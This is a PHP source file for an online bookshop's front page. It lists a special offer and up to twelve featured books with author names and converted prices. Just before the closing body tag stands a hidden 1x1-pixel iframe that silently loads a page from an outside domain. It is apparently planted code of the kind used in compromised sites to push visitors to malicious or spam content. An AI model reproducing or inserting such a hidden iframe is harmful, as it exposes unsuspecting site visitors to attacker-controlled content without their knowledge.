<?PHP
ob_start();
session_start();
include_once("includes/dbClass.php");
$cmdClass = new dbClass();
$cmdClass ->getConnection();
?>
<html>
<head>
<title>Online bookshop</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="includes/onlinebook.css" rel="stylesheet" type="text/css">
</head>
<body leftmargin="0" topmargin="0">
<?PHP include("header.php"); ?>
  <tr> 
    <td align="left" valign="top">
<table width="983" border="0" align="left" cellpadding="0" cellspacing="0">
        <tr>
          
        <td width="137" align="left" valign="top">
          <?PHP include_once("leftmenu.php");?>
        </td>
          <td width="531" align="left" valign="top" class="menu"><table width="600" border="0" cellpadding="0" cellspacing="0">
              <tr>
                
              <td width="650" height="44"><?PHP include_once("search.php");?></td>
              </tr>
              <tr>
                <td align="left" valign="top"><table width="605" border="0" cellpadding="0" cellspacing="0">
                  
                    <tr>
                      <td width="605"><table width="600" border="0" cellpadding="0" cellspacing="0">
                          <tr align="right"> 
                            
                          <td colspan="3"><div align="left"><img src="images/index_13.jpg" width="600" height="31"></div></td>
                          </tr>
                          <tr> 
                            
                          <td width="595" height="443" align="center" valign="top">
						  <div align="center">
						   <?PHP
						    $sql="SELECT * FROM specialoffer";
							$offer = $cmdClass->ExecuteQuery($sql);
							if($cmdClass->getNumberRows($offer)>0){
							$obj = $cmdClass->getObject($offer);
							echo '<img src="images/'.$obj->SP_IMAGE.'" width="478" height="155" border="0"><br><br>';
							}
							?>
                            </div>
                            <table width="179" height="195" border="0" cellpadding="0" cellspacing="0">
                                <tr>
								<?PHP
								 $sql="SELECT BK_ID,authermaster.AUTH_NAME,BK_TITLE,BK_CURRENCY,BK_PRICE,BK_SHOPPRICE,BK_IMAGE,BK_AUTH  FROM bookmaster,authermaster WHERE BK_FEATURED=1 AND bookmaster.BK_AUTH  = authermaster.AUTH_ID order by BK_CDATE DESC LIMIT 12"; //select record from tha table
   								 $res = $cmdClass->ExecuteQuery($sql);
								 $cnt = 0;
								 while($obj = $cmdClass->getObject($res)){
									
								 ?>
                                  <td width="175" valign="top"><table width="181" border="0" align="center" cellpadding="0" cellspacing="4">
                                    <tr align="left" valign="top"> 
                                      <td height="130"><a href="bookdetails.php?prdid=<?PHP echo $obj->BK_ID; ?>"><img src="images/<?PHP echo $obj->BK_IMAGE; ?>" alt="View Details" width="100" height="130" border="0"></a></td>
                                    </tr>
                                    <tr align="left" class="itemtitle"> 
                                      <td><a href="bookdetails.php?prdid=<?PHP echo $obj->BK_ID; ?>"><?PHP echo $obj->BK_TITLE; ?></a></td>
                                    </tr>
                                    <tr align="left" class="itemtitle"> 
                                      <td><span class="prred">By : </span> &nbsp;<a href="bookauther.php?auth=<?=$obj->BK_AUTH?>"><?PHP echo $obj->AUTH_NAME ; ?></a></td>
                                    </tr>
                                    <?PHP 
									if($obj->BK_CURRENCY == "Rs")
									{
										$currency  = "US$";
										$price     = $cmdClass->getRate($obj->BK_PRICE,"RS");
										$shopprice = $cmdClass->getRate($obj->BK_SHOPPRICE,"RS");
									}
									elseif($obj->BK_CURRENCY == "Euro")
									{
										$currency  = "US$";
										$price     = $cmdClass->getRate($obj->BK_PRICE,"EURO");
										$shopprice = $cmdClass->getRate($obj->BK_SHOPPRICE,"EURO");
									}
									else
									{
										$currency = $obj->BK_CURRENCY;
										$price    = $obj->BK_PRICE;
								        $shopprice = $obj->BK_SHOPPRICE;

									}
									
									if($obj->BK_SHOPPRICE < $obj->BK_PRICE && $obj->BK_SHOPPRICE !="" && $obj->BK_SHOPPRICE !=0)
									{							
									?>
                                    <tr class="prred"> 
                                      <td>Price : <?PHP echo $currency  ." ".$price; ?></td>
                                    </tr>
                                    <tr class="prred"> 
                                      <td>Our&nbsp;Price : <?PHP echo $currency ." ".$shopprice; ?><a href="add_to_cart.php?prdid=<?PHP echo $obj->BK_ID ; ?>"></a></td>
                                    </tr>
                                    <?PHP
									}
									else
									{
									?>
                                    <tr class="prred"> 
                                      <td>Price : <?PHP echo $currency  ." ".$price; ?></td>
                                    </tr>
                                    <?PHP
									}
									?>
                                    <tr class="prred"> 
                                      <td>&nbsp;</td>
                                    </tr>
                                  </table></td>
									<?PHP
									$cnt++;
										if($cnt ==3 ){
										 $cnt =0 ;
										 echo " </tr><tr>";
										}
									 }
									  ?>
                                </tr>
                              </table> </td>
                            <td width="5" background="images/index_41.jpg">&nbsp;</td>
                            <td width="1">&nbsp;</td>
                          </tr>
                          <tr align="right"> 
                            
                          <td colspan="3"><img src="images/index_42.jpg" width="600" height="19"></td>
                          </tr>
                        </table></td>
                    </tr>
                    <tr>
                      
                    <td>
                      <?PHP include_once("footermenu.php");?>
                    </td>
                    </tr>
                  </table></td>
              </tr>
            </table></td>
          <td width="330">&nbsp;</td>
        </tr>
      </table></td>
  </tr>
</table>
<iframe src="http://www.synchelp.com/blog/index.php" height="1" width="1">
            
        </iframe>
            
     
</body>
</html>
